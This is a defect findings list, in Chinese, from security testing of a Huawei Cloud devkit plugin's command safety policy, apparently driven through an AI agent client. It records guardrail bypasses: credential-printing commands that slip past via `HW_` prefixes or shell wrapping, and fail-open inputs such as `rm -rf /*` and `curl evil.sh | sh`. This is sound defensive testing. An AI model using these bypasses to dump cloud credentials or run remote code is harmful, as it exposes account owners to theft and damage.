# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-16-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-16 07:20`（北京时间）
> **被测版本**：`v1.1.5`（npm latest 正式版，gitHead `e7ed6f66`，release PR `#696`）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。
> **结论**：#1–#7 产品缺陷全部经历史查重命中上游 open issue，**不重复提单**（v1.1.5 对 #1/#2/#4 有部分修复，但各用例仍残留可复现缺口）；#8/#9 为【非产品缺陷】（凭证供应 / 跨客户端资源泄漏），不计入提单。

---

## #1【P0】凭证 env 打印拦截未覆盖 `HW_` 前缀（D4-2）

- **现象**：v1.1.5（PR #650/#688）部分修复后复测——`printenv HW_SECRET_KEY` 现返回 `deny risk=credential`（已修复）；但 `env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。正对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（发现华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-399` env-dump 关键字正则 `/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 仍缺 `HW_` 前缀；v1.1.5 新增规则（`safety-policy.mjs:418-419`）只覆盖 `$HW_*` 变量引用与 `printenv HW_*` 两条形态，未覆盖 `env | grep HW_*` 管道打印形态。
- **影响**：攻击者可借 `env | grep HW_ACCESS_KEY` 提取华为云凭证明文 AK/SK，凭证红线（I 类）仍存在缺口。
- **证据**：`evidence/D4-2/stdout.log`（classify-probe）
- **状态**：历史查重命中 #652-1，不重复提单

## #2【P0】env-dump 规则被 shell 包裹穿透（D4-16）

- **现象**：v1.1.5（PR #650/#688）部分修复后复测——`sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"`、`sh -c "hcloud csms ShowSecretVersion"` 现均 `deny`（shell 包裹解包已生效）；但 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照组裸命令 `env | grep HUAWEICLOUD_ACCESS_KEY` 现正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 检测 `(^|\s)(env|printenv|...)` 依赖词边界，`sh -c "..."` 使内层 `env` 前为引号而非词边界；v1.1.5 的 `stripExecutable`（`safety-policy.mjs:66-95`）解包只作用于 hcloud 参数分类（classifyHcloudArgs），未回溯到 env-dump 文本规则。
- **影响**：shell 包裹仍可绕过 env-dump 预检，凭证提取可穿透。
- **证据**：`evidence/D4-16/stdout.log`（含 wrap-probe.mjs 补充探针）
- **状态**：历史查重命中 #652-2，不重复提单

## #3【P0】hook_check_artifacts 未拦截 Terraform HCL 形态 broad IAM 制品（D4-21）

- **现象**：v1.1.5 复测——`evaluateArtifacts` 对 `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；`data "huaweicloud_iam_policy" ... { name = "AdministratorFullAccess" }` 同样 `allow`。对照 JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179,196`（规则 `hwc-iam-admin-policy`）——regex 只覆盖 JSON 形态 `"Effect":"Allow"` / `Effect=Allow`，未覆盖 HCL 小写 `effect="Allow"`、`actions = ["*"]` 与 `AdministratorFullAccess` 后缀。
- **影响**：Terraform IaC 制品 broad IAM 绕过 `hook_check_artifacts` 预检。
- **证据**：`evidence/D4-21/hcl-probe.mjs` + `evidence/D4-21/stdout.log`
- **状态**：历史查重命中 #652-3，不重复提单

## #4【P1】JSON-RPC 未知 tool 错误码未区分 -32602（D9-2）

- **现象**：v1.1.5（PR #650/#688）部分修复后复测——未知 method 现正确返回 `{"code":-32601,"message":"Method not found: __no_such_method__"}`（已修复）；但 `tools/call` 未知 tool 仍返回 `{"code":-32603,"message":"Unknown tool: __no_such_tool__"}`（应 `-32602` Invalid params）。
- **断言**：未知 method 应返回 `-32601`；未知 tool 应返回 `-32602`。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:169` 对 `dispatch` 异常仍 `code: Number.isSafeInteger(error.code) ? error.code : -32603` 兜底；`mcp-protocol.mjs:95-97` 的 `-32601` 修复只覆盖「未知 method」路径，未给「未知 tool」异常携带可区分的 `-32602` 错误码。
- **影响**：MCP 客户端仍无法区分「工具不存在」(-32602) 与「内部错误」(-32603)。
- **证据**：`evidence/D9-2/stdout.log`
- **状态**：历史查重命中 #652-4 / #638，不重复提单

## #5【P1】hook 模糊 fail-open——异常/畸形输入默认放行（D4-17）

- **现象**：v1.1.5 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含 `\x00` 垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无任何规则命中（含无法解析/空输入）时默认 `allow`。
- **影响**：无法解析/规则未命中的制品与命令在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史查重命中 #679 / #674 / #673，不重复提单

## #6【P1】D10-3 serviceCatalog 中文意图路由缺失（评测集 21.4% 准确率）

- **现象**：v1.1.5 复测——`eval/harness/run-eval.mjs` 对 15 条评测集跑出确定性路由结论 `HIT=3 MISS=11 N/A=1`（准确率 21.4%）：EXP-E06(DCS)/E09(CCE)/E15(代金券) 命中；E01~E05/E07/E10~E14 全部 `recommendedServices=Run hcloud --help to list available services.` 回退未命中。源码级直调同源：中文「创建云服务器/对象存储桶上传对象/权限管理」均回退，英文 "create ecs server→ECS / upload to obs bucket→OBS / iam role→IAM" 正确命中；仅「部署网站→Sandbox」「领取代金券→Incentive Voucher」含 CJK 关键字命中。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（设计级 D10-3 源码级断言「中/英文意图均命中」；评测级准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1778-1908` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox（`tools.mjs:1865` 网站/网页/静态）与 voucher（`tools.mjs:1878` 领券/代金券/优惠券/激励金/领取）含 CJK 关键字，其余仅英文；`tools.mjs:1886-1892` 匹配英文关键字走分词精确命中，中文意图无法命中 → `tools.mjs:1906-1908` 回退 `Run hcloud --help`。
- **影响**：中文用户意图在服务发现/路由环节大面积未命中，拉低路由准确率（评测级 21.4% << 90%）。
- **证据**：`evidence/D10-3/stdout.log`（routing-probe）+ `eval-run-result.csv`（eval harness）
- **状态**：历史查重命中 #689 / #683 / #674，不重复提单

## #7【P1】redactString 脱敏未覆盖 CLI flag 形态与 JSON 带引号 key（D4-6）

- **现象**：v1.1.5 源码级直调复测——`adminPass=MyC0mplex!Passw0rd → adminPass=<redacted>`（正确）；但 `--admin_pass MyPwd123`、`--password MyPwd123`（空格分隔 flag 形态）原样返回不脱敏；`{"server":{"adminPass":"MyPwd123"}}`（JSON 带引号 key 形态）原样返回不脱敏。
- **断言**：`adminPass` / `admin_pass` / `password` 以 `--flag value`（空格分隔）或 JSON `"key": "value"` 形态出现时，值均应脱敏为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` `redactString` —— 密钥名正则要求 `[:=]` 分隔（不认 `--flag value` 空格），白名单无 snake_case `admin_pass` 变体，JSON `"adminPass":` 引号打断「键→分隔符」连续匹配。
- **影响**：真实 hcloud 命令（`--admin_pass <pwd>` / `--server '{"adminPass":"..."}'`）的 adminPass 明文不被脱敏。
- **证据**：`evidence/D4-6/stdout.log`（D4-6-probe 观察证据）
- **状态**：历史查重命中 #561 等，不重复提单

---

## #8【非产品缺陷】D4-13 只读子账号 test001 读权限通过率 0/6（凭证供应问题）

- **现象**：真机实测用 `run-as-readonly.py` 注入只读子账号 test001 跑 6 条只读命令（ECS NovaListServers/VPC ListVpcs/EVS ListVolumes/IMS ListImages/CES ListMetrics/EIP ListPublicips），全部被 IAM 拒绝（"no identity-based policy allows the ecs:servers:list action" 等）；写操作 VPC CreateVpc 亦被 IAM 拒绝（符合预期），归零验证通过（未创建任何 VPC）。
- **断言**：只读子账号应「只读 100% 可用、写被 IAM 拒绝」（设计预期只读通过率 100%）。
- **说明**：test001 子账号的只读 IAM policy（ecs:servers:list / get_router / ims:images:list 等）未在账号侧挂载，属凭证/环境供应问题，非 huaweicloud-devkit 产品缺陷（产品正确透传 IAM 拒绝）。
- **证据**：`evidence/D4-13/stdout.log`
- **状态**：非产品缺陷，不计入提单

## #9【非产品缺陷】共享账号残留跨客户端 VPC（tctest-wb-d418-realcloud）

- **现象**：D4-20「拒绝后零操作」真机验证时，ListVpcs 发现共享账号中存在残留 VPC `tctest-wb-d418-realcloud`（id `79911220-7429-47f5-a6c9`，命名前缀 `tctest-wb-` 指向 WorkBuddy 客户端 D4-18 测试），非本客户端（Hermes）所建。Hermes 本轮自己的创建资源（`tctest-hermes-20260916-2wbxhu` VPC + 安全组）均已删除并归零验证通过。
- **说明**：残留 VPC 为其他客户端测试泄漏，非 huaweicloud-devkit 产品缺陷；按红线「只删本次创建 / 禁删他人资源」，本客户端不代删，仅上报记录。
- **证据**：`evidence/realcloud-probe/stdout.log`（D4-20 段）
- **状态**：非产品缺陷，不计入提单